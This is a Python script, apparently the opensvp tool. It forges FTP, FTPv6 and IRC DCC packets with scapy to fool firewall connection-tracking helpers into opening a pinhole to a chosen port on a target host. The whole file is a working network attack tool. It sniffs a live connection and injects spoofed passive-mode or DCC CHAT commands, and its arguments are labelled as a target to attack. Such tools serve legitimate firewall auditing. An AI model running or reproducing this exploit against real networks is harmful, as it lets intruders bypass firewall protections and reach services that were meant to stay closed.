#!/usr/bin/env python
#
# Copyright 2011 Eric Leblond <eric@regit.org>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os,sys
import re

import threading
import argparse

from scapy.all import *

import ftplib
from time import sleep

class attack_target:
    def __init__(self, iface, ip, port, verbose = False):
        self.iface = iface
        self.ip = ip
        self.port = port
        self.l3proto = 'IPv4'
        self.verbose = verbose

    def build_filter(self):
        return ""

    def build_command(self):
        return ""

    def inject_condition(self,pkt):
        if pkt[TCP].flags & 8 != 0:
            return True
        return False

    def server_callback(self, pkt):
        # any packet is ok
        if self.inject_condition(pkt):
            if self.verbose:
                print "Working on following base"
                print pkt.show()
            # set ether pkt src as dst
            orig_src = pkt[Ether].src
            orig_dst = pkt[Ether].dst
            # change payload
            if self.l3proto == 'IPv4':
                att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
                att[IP] = pkt[IP]
                att[IP].id = pkt[IP].id + 1
                del att[IP].chksum
                del att[IP].len
            else:
                att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IPv6()/TCP()
                att[IPv6] = pkt[IPv6]
                del att[IPv6].chksum
                del att[IPv6].plen

            att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
            del att[TCP].chksum
            att[TCP].payload = self.build_command()
            # send packet
            if self.verbose:
                print "Sending attack packet"
                print att.show()
                sendp(att, iface=self.iface)
            else:
                sendp(att, iface=self.iface, verbose=0)
            self.cleanup()
            sys.exit(0)

    def initialize(self):
        return None

    def cleanup(self):
        return None

    def run(self):
        self.initialize()
        sniff(iface=self.iface, prn=self.server_callback, filter=self.build_filter(), store=0, timeout=40)

class ftp_helper(attack_target):
    def build_command(self):
        return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)

    def build_filter(self):
        return "src host %s and src port 21" % (self.ip)

    def inject_condition(self,pkt):
        if re.match("^220",pkt.sprintf("%TCP.payload%")):
            return True
        return False

    def initialize(self):
        self.cv = threading.Condition()
        conn = threading.Thread(None, self.ftp_connect, args=(self,))
        conn.start()

    def cleanup(self):
        self.cv.acquire()
        self.cv.notify()
        self.cv.release()
          
    def ftp_connect(self, option=''):
        self.cv.acquire()
        sleep(1)
        if self.verbose:
            print "Starting ftp connection"
        try:
            ftp = ftplib.FTP(self.ip)
        except:
            sys.stderr.write("Unable to open connection to ftp server\n")
            self.cv.release()
            sys.exit(0)
        self.cv.wait()
        self.cv.release()

class ftp6_helper(ftp_helper):
    def __init__(self, iface, ip, port, verbose = False):
        ftp_helper.__init__(self, iface, ip, port, verbose)
        self.l3proto = "IPv6"

    def build_command(self):
        return "229 Extended Passive Mode OK (|||%d|)\r\n" % (self.port)
        
class irc_helper(attack_target):
    def ipnumber(self, ip):
        ip=ip.rstrip().split('.')
        ipn=0
        while ip:
            ipn=(ipn<<8)+int(ip.pop(0))
        return ipn
    def build_command(self):
        return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(self.ip), self.port)
    def build_filter(self):
        return "tcp and src host %s and dst port 6667" % (self.ip)

parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
parser.add_argument('-t', '--target', default='192.168.2.2', help='IP address of target to attack')
parser.add_argument('-i', '--iface', default='eth0', help='Interface to use for sniffing communication')
parser.add_argument('-p', '--port', default=5432, help='Target port that should be open on server after attack')
parser.add_argument('-v', '--verbose', default=False, action="store_true", help="Show verbose output")
parser.add_argument('--helper', default='ftp', help='Protocol and helper to attack (ftp [default], ftp6, irc)')
args = parser.parse_args()

# if not root...kick out
if not os.geteuid()==0:
    sys.stderr.write("Need to be root to run the script\n")
    sys.exit(1)

if args.helper == 'ftp':
    target = ftp_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
elif args.helper == 'irc':
    target = irc_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
elif args.helper == 'ftp6':
    target = ftp6_helper(args.iface, args.target, int(args.port), verbose=args.verbose)
else:
    sys.exit("Selected protocol is currently unsupported")

target.run()
